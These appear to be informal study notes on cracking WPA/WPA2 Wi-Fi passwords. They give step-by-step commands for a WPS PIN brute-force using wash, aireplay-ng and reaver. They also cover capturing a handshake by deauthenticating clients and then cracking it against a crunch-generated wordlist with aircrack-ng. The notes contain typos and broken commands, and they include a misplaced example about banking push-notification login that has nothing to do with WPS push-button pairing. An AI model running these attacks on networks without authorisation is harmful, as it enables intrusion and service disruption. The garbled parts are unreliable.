WPA/WPA2 Cracking
both can be cracked using same method
made to resolve issues in wep 
more secure
each packect encrypted using temporary key

packect have no useful info

wps feature help to connect device without password
authentication done using 8 digit pin
we can try all combination in small time
then wps can be used to complete actual password
method work if router configure not to use push button authentication
## example push button authentication
A user tries to log in to their online banking account. After entering their username and password, they receive a push notification on their smartphone. They open the notification, see the details of the login attempt, and press the "Approve" button. The authentication system verifies the approval, and the user is granted access to their account

## METHOD open two terminals 
put monitor mode wlan0 
ifconfig wlan0 down
airmon-ng check kill          
iwconfig wlan0 mode monitor
ifconfig wlan0 up
wash --interface wlan0 #show network all network near using wps
aireplay-ng --fakeauth 30 -a bssid -h us device3 mac address wlan0
   ## 30 sec time

   ##lck sometimes lock after fail attempts 
   ## cracking not work if push button authentication only method is try attacking
   ## associate using fake authentication
   
## go to second terminal
reaver --bssid  --channel 11 --interface wlano --vvv --no-associate
## reaver is a program using brute force to give us key
## vvv used to tell detail to show us as much information as possible.This is really helpful. If it fails or things go wrong .able to know what's happening. stop associate as we aqre doing up manually.
first hit enter second terminal

this method not work for new router but u can try it if works good luck


CAPTURING HANDSHAKE
wep weakness were fixed 
packect have no used full data key changes
packing aid us in hacking are handshake
handshake 4 packects sent to a clients connect to network

method
## put wireless adapter monitor mode
## open two terminal
airodump-ng wlan0 ## see network
airodum-ng -bssid --channel --write handshake wlan0
enter
## write command in second terminal
aireplay-ng --deauth 4 -a bssid -c mac client wlan0 ##enter

##on first terminal handshake would be shown copy it

NOTE: handshake dose not contain data it checks whether password valid or not

Create Wordlist skill used in pen testing
syntax crunch[min][max]-t[]-0[filename]
crunch 6 8 123abc$ -owordlist -ta99j
 
 #man crunch shows all commands making different passwords
crunch 6 8 abc12 -o test.txt
cat test.txt
#to show passwords

and we are ready to go and crack the password.

 Aircrack-ng is going to unpack the handshake
The MIC the message integrity code
is what's used by the access point
to verify whether a password is correct or not.

if the MIC generated using this information + the first password is the same
then the password used to generate this MIC Otherwise this password is wrong
and it will move to the next password.
repeat process
until they use all of this information

aircrack-ng wpa_handshake-01.cap -w test.txt run this command 
#test each password if mic correct u get password
